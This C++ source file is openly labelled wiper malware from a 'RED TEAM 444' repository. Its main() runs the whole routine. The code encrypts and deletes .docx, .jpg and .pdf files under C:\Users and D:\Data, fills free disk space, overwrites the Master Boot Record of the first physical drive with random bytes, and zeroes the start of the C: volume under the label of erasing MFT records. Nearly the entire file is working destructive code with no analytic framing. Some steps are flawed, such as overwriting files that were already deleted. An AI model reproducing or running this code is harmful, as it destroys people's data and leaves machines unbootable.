/*RED TEAM 444
  author : U0lEREhBTlQ=
  https://github.com/RED-TEAM-444/Wiper-Malware.git
*/

#include <iostream>
#include <fstream>
#include <filesystem>
#include <random>
#include <windows.h>
#include <thread>
#include <openssl/aes.h>  // Assuming OpenSSL for AES encryption
#include <vector>
#include <string>

namespace fs = std::filesystem;

// Advanced Wiper Techniques
void multipleRandomOverwrites(const std::string& filepath, int passes = 3);
void clearFreeDiskSpace();
void eraseMFTRecords();
void wipeMBR();
void encryptFile(const std::string& filepath, const unsigned char* key);

// Helper Functions
void scanAndWipe(const std::string& directory, const std::vector<std::string>& extensions);
bool shouldWipeFile(const std::string& filepath, const std::vector<std::string>& extensions);

// Main Function to Run Wiper
void runWiper();

// Function to perform multiple overwrites with random bytes
void multipleRandomOverwrites(const std::string& filepath, int passes) {
    try {
        std::ofstream file(filepath, std::ios::binary | std::ios::in);
        if (file.is_open()) {
            auto fileSize = fs::file_size(filepath);
            
            std::random_device rd;
            std::mt19937 gen(rd());
            std::uniform_int_distribution<> dist(0, 255);
            
            for (int pass = 0; pass < passes; pass++) {
                file.seekp(0);
                for (uint64_t i = 0; i < fileSize; i++) {
                    char randomByte = static_cast<char>(dist(gen));
                    file.put(randomByte);
                }
                file.flush();
            }
            file.close();
        }
        fs::remove(filepath);  // Delete the file after overwriting
        std::cout << "File " << filepath << " overwritten and deleted successfully.\n";
    } catch (const std::exception& e) {
        std::cerr << "Error overwriting file: " << e.what() << "\n";
    }
}

// Function to wipe free disk space by creating and filling a temporary file
void clearFreeDiskSpace() {
    std::string tempFile = "C:\\Temp\\wipe.tmp";

    try {
        ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
        if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable, &totalBytes, &totalFreeBytes)) {
            uint64_t freeSpace = totalFreeBytes.QuadPart;
            std::ofstream file(tempFile, std::ios::binary);

            if (file.is_open()) {
                char buffer[4096];
                std::random_device rd;
                std::mt19937 gen(rd());
                std::uniform_int_distribution<> dist(0, 255);
                
                for (size_t i = 0; i < sizeof(buffer); ++i) {
                    buffer[i] = static_cast<char>(dist(gen));
                }

                uint64_t writtenBytes = 0;
                while (writtenBytes < freeSpace - (100 * 1024 * 1024)) {
                    file.write(buffer, sizeof(buffer));
                    writtenBytes += sizeof(buffer);
                }
                file.close();
                fs::remove(tempFile);
                std::cout << "Free disk space wiped successfully.\n";
            }
        } else {
            std::cerr << "Error retrieving free space info.\n";
        }
    } catch (const std::exception& e) {
        std::cerr << "Error wiping free disk space: " << e.what() << "\n";
    }
}

// Function to erase MFT records
void eraseMFTRecords() {
    HANDLE hDrive = CreateFileA("\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    
    if (hDrive == INVALID_HANDLE_VALUE) {
        std::cerr << "Error opening drive for MFT wiping.\n";
        return;
    }

    char buffer[512] = {0};
    DWORD bytesWritten;
    LARGE_INTEGER sectorOffset;
    sectorOffset.QuadPart = 0;

    if (!SetFilePointerEx(hDrive, sectorOffset, NULL, FILE_BEGIN)) {
        std::cerr << "Error setting file pointer for MFT erase.\n";
    }

    for (int i = 0; i < 10; ++i) {
        if (!WriteFile(hDrive, buffer, sizeof(buffer), &bytesWritten, NULL)) {
            std::cerr << "Error writing to drive for MFT erase.\n";
            break;
        }
    }

    CloseHandle(hDrive);
    std::cout << "MFT records wiped.\n";
}

// Function to wipe the MBR
void wipeMBR() {
    HANDLE hDrive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (hDrive == INVALID_HANDLE_VALUE) {
        std::cerr << "Error opening physical drive for MBR wiping.\n";
        return;
    }

    char mbrBuffer[512] = {0};
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 255);
    for (int i = 0; i < 512; i++) {
        mbrBuffer[i] = static_cast<char>(dist(gen));
    }

    DWORD bytesWritten;
    if (!WriteFile(hDrive, mbrBuffer, 512, &bytesWritten, NULL)) {
        std::cerr << "Error writing to drive to wipe MBR.\n";
    } else {
        std::cout << "MBR wiped successfully.\n";
    }

    CloseHandle(hDrive);
}

// AES Encryption Function
void encryptFile(const std::string& filepath, const unsigned char* key) {
    std::ifstream infile(filepath, std::ios::binary);
    std::ofstream outfile(filepath + ".enc", std::ios::binary);

    if (!infile.is_open() || !outfile.is_open()) {
        std::cerr << "Error opening file for encryption: " << filepath << "\n";
        return;
    }

    AES_KEY aesKey;
    AES_set_encrypt_key(key, 128, &aesKey);

    unsigned char inBuffer[AES_BLOCK_SIZE];
    unsigned char outBuffer[AES_BLOCK_SIZE];

    while (infile.read(reinterpret_cast<char*>(inBuffer), AES_BLOCK_SIZE)) {
        AES_encrypt(inBuffer, outBuffer, &aesKey);
        outfile.write(reinterpret_cast<char*>(outBuffer), AES_BLOCK_SIZE);
    }

    infile.close();
    outfile.close();
    fs::remove(filepath);
    std::cout << "File " << filepath << " encrypted and deleted.\n";
}

// Helper function to scan directories recursively and wipe target files
void scanAndWipe(const std::string& directory, const std::vector<std::string>& extensions) {
    for (const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (fs::is_regular_file(entry)) {
            const std::string filepath = entry.path().string();
            if (shouldWipeFile(filepath, extensions)) {
                unsigned char key[16] = {0};  // Example AES key
                encryptFile(filepath, key);   // Encrypt the file
                multipleRandomOverwrites(filepath);  // Overwrite and delete file
            }
        }
    }
}

// Function to check if a file matches the target extensions
bool shouldWipeFile(const std::string& filepath, const std::vector<std::string>& extensions) {
    for (const auto& ext : extensions) {
        if (filepath.ends_with(ext)) {
            return true;
        }
    }
    return false;
}

// Main function that runs the entire wiper
void runWiper() {
    std::vector<std::string> directories = {"C:\\Users\\", "D:\\Data\\"};
    std::vector<std::string> extensions = {".docx", ".jpg", ".pdf"};
    
    for (const auto& directory : directories) {
        scanAndWipe(directory, extensions);
    }

    clearFreeDiskSpace();   // Clear free disk space after file wiping
    wipeMBR();              // Wipe the Master Boot Record
    eraseMFTRecords();      // Erase MFT records
}

int main() {
    runWiper();
    return 0;
}
